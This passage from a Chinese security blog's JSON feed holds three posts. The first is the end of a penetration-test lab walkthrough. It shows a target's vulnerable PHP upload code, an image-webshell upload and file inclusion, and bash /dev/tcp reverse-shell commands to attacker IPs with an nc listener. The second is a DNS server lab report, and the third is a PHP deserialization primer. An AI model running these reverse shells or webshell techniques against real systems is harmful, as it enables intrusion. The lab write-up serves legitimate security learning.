class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$iname</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$r</span><span class=\"token operator\">=</span><span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">PATHINFO_EXTENSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$image</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpeg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$image</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$finfo</span> <span class=\"token operator\">=</span> @<span class=\"token keyword\">new</span> <span class=\"token class-name\">finfo</span><span class=\"token punctuation\">(</span><span class=\"token constant\">FILEINFO_MIME</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n\t<span class=\"token variable\">$filetype</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$finfo</span><span class=\"token operator\">-></span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/image\\/jpeg/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filetype</span> <span class=\"token punctuation\">)</span>  <span class=\"token operator\">||</span> <span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/image\\/png/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filetype</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/image\\/gif/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filetype</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'uploaded_images/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t\t\t\t\t <span class=\"token punctuation\">&#123;</span>\n\t\t\t\t\t\t\t  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Uploaded successfully \"</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t  <span class=\"token variable\">$update</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'insert into users(name,address,image,id) values(\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\',\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$address</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\',\\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$iname</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\', \\''</span><span class=\"token operator\">.</span><span class=\"token variable\">$id</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\\')'</span><span class=\"token punctuation\">;</span> \n\t\t\t\t\t\t\t <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$update</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t  \n\t\t\t\t\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">else</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>i told you dear, only png,jpg and gif file are allowed\"</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>only png,jpg and gif file are allowed\"</span><span class=\"token punctuation\">;</span>\n\t\t\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>通过文件读取获取 panel 的源码</p>\n<p>文件上传部分仅允许上传图片文件，但是仅简单判断后缀名，尝试上传图片马文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726103940791.png\" alt=\"image-20220726103940791\" /></p>\n<p>上传图片马</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726103923536.png\" alt=\"image-20220726103923536\" /></p>\n<p>利用文件包含执行命令</p>\n<p>反弹 shell kali 命令行里输入 nc -lvnp 6666 开始监听，同时 burp 的 post 请求中执行 echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.161.143/6666 0&gt;&amp;1&quot; | bash，注意要将此命令先经过 URL 编码才能发送 (这个 ip 是攻击机的 IP 地址)</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726110853078.png\" alt=\"image-20220726110853078\" /></p>\n<p>连接成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726111050889.png\" alt=\"image-20220726111050889\" /></p>\n<p>提权显示需要终端，输入命令 python -c 'import pty;pty.spawn (&quot;/bin/bash&quot;)'</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726111155443.png\" alt=\"image-20220726111155443\" /></p>\n<p>python -c 'import pty;pty.spawn (&quot;/bin/bash&quot;)' 解释</p>\n<p>当我们拿到一个 webshell 的时候，我们能够执行一些命令，但是这些命令都是非交互的，也就是说不存在上下文的概念。当我们想使用 vim、top 等命令时，webshell 就无能为力了。</p>\n<p>一般我们都会使用 nc 来接收反弹来的 shell，只需要在目标上 (以 linux 为例) 执行：</p>\n<p><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/192.168.2.134/4444 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>本地接收一下就 ok 了，但是反弹回来的 shell，或多或少都会存在问题，比如当我想使用 top 命令时就会提示没有  <code>tty</code> 。简单的来说就是没有上下文环境，这样的话， <code>vim</code> ， <code>sudo</code>  等操作都做不了，有时候还需要其他工具，很麻烦。</p>\n<p>溢出提权</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python <span class=\"token operator\">-</span>c <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>来得到交互的 Shell, 一般的系统都默认安装 python</p>\n",
            "tags": [
                "渗透测试",
                "渗透测试"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/03/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/",
            "url": "https://blog.xcu.icu/2022/11/03/DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/",
            "title": "DNS服务器",
            "date_published": "2022-11-02T16:00:00.000Z",
            "content_html": "<h2 id=\"实验3dns服务器配置\"><a class=\"anchor\" href=\"#实验3dns服务器配置\">#</a> 实验 3：DNS 服务器配置</h2>\n<p><strong>实验目的</strong></p>\n<blockquote>\n<p>1、了解 DNS 基本概念及域名解析过程；</p>\n<p>2、熟悉常规 DNS 服务器的安装与配置；</p>\n<p>3、掌握辅助 DNS 服务器的配置；</p>\n<p>4、掌握 DNS 服务器配置过程中一般排错方法。</p>\n</blockquote>\n<p><strong>实验参考</strong></p>\n<blockquote>\n<p>实验步骤可参考《5-1 - 主 dns 服务器配置.pdf》文件。</p>\n<p>实验步骤可参考《5-2 - 辅助 DNS 服务器配置.pdf》文件。</p>\n</blockquote>\n<h3 id=\"1实验要求\"><a class=\"anchor\" href=\"#1实验要求\">#</a> 1. 实验要求</h3>\n<blockquote>\n<p>任务 1：主 DNS 服务器配置</p>\n<p>任务 2：辅助 DNS 服务器配置</p>\n<p>要求：<span class=\"exturl\" data-url=\"aHR0cDovL3huLS14eHgtYzg4ZDg5eHc2Zi5jbw==\">域名为 xxx.co</span>，其中 xxx 为姓名拼音拼写。</p>\n</blockquote>\n<h3 id=\"2实验过程\"><a class=\"anchor\" href=\"#2实验过程\">#</a> 2. 实验过程</h3>\n<h4 id=\"21-主dns服务器配置\"><a class=\"anchor\" href=\"#21-主dns服务器配置\">#</a> 2.1 主 DNS 服务器配置</h4>\n<h5 id=\"211-环境准备\"><a class=\"anchor\" href=\"#211-环境准备\">#</a> 2.1.1 环境准备</h5>\n<p>安装服务软件包</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\"># yum install -y bind bind-chroot bind-utils<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103144721267.png\" alt=\"image-20221103144721267\" /></p>\n<h5 id=\"212-修改4个配置文件\"><a class=\"anchor\" href=\"#212-修改4个配置文件\">#</a> 2.1.2 修改 4 个配置文件</h5>\n<ol>\n<li>\n<p>修改主配置文件，主要更改三个位置如下图</p>\n<p>开头位置</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103145538563.png\" alt=\"image-20221103145538563\" /></p>\n<p>结尾位置</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103145737581.png\" alt=\"image-20221103145737581\" /></p>\n</li>\n<li>\n<p>修改区域配置文件（复制原有的样本文件）</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">#cp -p &#x2F;etc&#x2F;named.rfc1912.zones &#x2F;etc&#x2F;named.lq.zone\n#这里-p是为了保持权限一致<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103150314623.png\" alt=\"image-20221103150314623\" /></p>\n<p>修改区域文件，保留正向区域和反向区域引入部分</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103151036445.png\" alt=\"image-20221103151036445\" /></p>\n</li>\n<li>\n<p>修改正向解析文件（记录域名和 ip 地址的对应关系）</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">#cp -p &#x2F;var&#x2F;named&#x2F;named.localhost &#x2F;var&#x2F;named&#x2F;named.lq.co<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103152432683.png\" alt=\"image-20221103152432683\" /></p>\n<p>修改解析文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103153833142.png\" alt=\"image-20221103153833142\" /></p>\n</li>\n<li>\n<p>修改反向解析文件</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">#cp -p &#x2F;var&#x2F;named&#x2F;named.loopback &#x2F;var&#x2F;named&#x2F;named.lq.loopback<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103152946305.png\" alt=\"image-20221103152946305\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103153720430.png\" alt=\"image-20221103153720430\" /></p>\n</li>\n</ol>\n<p>开启服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103154120053.png\" alt=\"image-20221103154120053\" /></p>\n<h5 id=\"213测试\"><a class=\"anchor\" href=\"#213测试\">#</a> 2.1.3 测试</h5>\n<p>先在测试机安装工具包</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">#sudo yum install -y bind-utils<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103160707160.png\" alt=\"image-20221103160707160\" /></p>\n<p>修改静态 DNS</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161100819.png\" alt=\"image-20221103161100819\" /></p>\n<p>进入 nslookup 的交互模式</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161253757.png\" alt=\"image-20221103161253757\" /></p>\n<p>超时报错，测试寻找问题</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161404203.png\" alt=\"image-20221103161404203\" /></p>\n<p>测试主机可达，测试防火墙的问题</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161505377.png\" alt=\"image-20221103161505377\" /></p>\n<p>关闭防火墙，能正常解析</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161646400.png\" alt=\"image-20221103161646400\" /></p>\n<p>这里是防火墙策略设置问题</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103161959246.png\" alt=\"image-20221103161959246\" /></p>\n<p>将 DNS 服务加入防火墙设置策略中，再进行测试</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162110067.png\" alt=\"image-20221103162110067\" /></p>\n<p>使用 dig 命令测试</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162313264.png\" alt=\"image-20221103162313264\" /></p>\n<p>反向解析</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162349247.png\" alt=\"image-20221103162349247\" /></p>\n<h4 id=\"22-辅助dns服务器配置\"><a class=\"anchor\" href=\"#22-辅助dns服务器配置\">#</a> 2.2 辅助 DNS 服务器配置</h4>\n<h5 id=\"221-主dns服务器的修改\"><a class=\"anchor\" href=\"#221-主dns服务器的修改\">#</a> 2.2.1 主 DNS 服务器的修改</h5>\n<p>修改主配置文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103162803420.png\" alt=\"image-20221103162803420\" /></p>\n<p>修改主解析文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163107221.png\" alt=\"image-20221103163107221\" /></p>\n<p>修改反向解析文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163256050.png\" alt=\"image-20221103163256050\" /></p>\n<p>重启服务</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103163349204.png\" alt=\"image-20221103163349204\" /></p>\n<h5 id=\"222-辅助dns服务器的修改\"><a class=\"anchor\" href=\"#222-辅助dns服务器的修改\">#</a> 2.2.2 辅助 DNS 服务器的修改</h5>\n<p>修改主配置文件（和主 DNS 一样）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103164025601.png\" alt=\"image-20221103164025601\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103164042746.png\" alt=\"image-20221103164042746\" /></p>\n<p>配置区域文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103165149281.png\" alt=\"image-20221103165149281\" /></p>\n<h5 id=\"223测试\"><a class=\"anchor\" href=\"#223测试\">#</a> 2.2.3 测试</h5>\n<p>辅助 dns</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171115638.png\" alt=\"image-20221103171115638\" /></p>\n<p>Linux 客户端</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171236892.png\" alt=\"image-20221103171236892\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221103171227238.png\" alt=\"image-20221103171227238\" /></p>\n<h3 id=\"3实验小结\"><a class=\"anchor\" href=\"#3实验小结\">#</a> 3. 实验小结</h3>\n<p>本次实验主要实践了 DNS 服务器的配置，复习了 dig 的使用，学会了 nslookup 的使用</p>\n",
            "tags": [
                "网络服务应用",
                "DNS服务器"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "php反序列化",
            "date_published": "2022-11-01T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>php 文件在执行后对象对象会被销毁，但是这个对象很多情况下我们想要持续的使用，序列化就是这样一个过程，通过序列化我们可以将对象转化成字符串存到磁盘中长期保存</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125;\n\nO:表示序列化的事对象\n&lt; length&gt;:表示序列化的类名称长度\n&lt; class name&gt;：表示序列化的类的名称\n&lt; n &gt;:表示被序列化的对象的变量个数\n&lt; field name 1&gt;：属性名\n&lt; field value 1&gt;：属性值<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//O:4:\"demo\":2:&#123;s:5:\"clown\";s:5:\"joker\";s:4:\"test\";s:4:\"test\";&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031204530320.png\" alt=\"image-20221031204530320\" /></p>\n<h2 id=\"魔术方法\"><a class=\"anchor\" href=\"#魔术方法\">#</a> 魔术方法</h2>\n<h3 id=\"__construct构造函数\"><a class=\"anchor\" href=\"#__construct构造函数\">#</a> __construct ()，构造函数</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031204826374.png\" alt=\"image-20221031204826374\" /></p>\n<p>这个函数在类被实例化的时候会自动调用</p>\n<h3 id=\"__destruct析构函数\"><a class=\"anchor\" href=\"#__destruct析构函数\">#</a> __destruct ()，析构函数</h3>\n<p>当类被删除前会自动调用</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"构造函数\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"析构函数\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031205700467.png\" alt=\"image-20221031205700467\" /></p>\n<h3 id=\"__call调用不可调用的方法\"><a class=\"anchor\" href=\"#__call调用不可调用的方法\">#</a> __call ()，调用不可调用的方法</h3>\n<p>该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $arguments 则以数组的方式接收不存在方法的多个参数</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"构造函数\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"析构函数\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$arguments</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    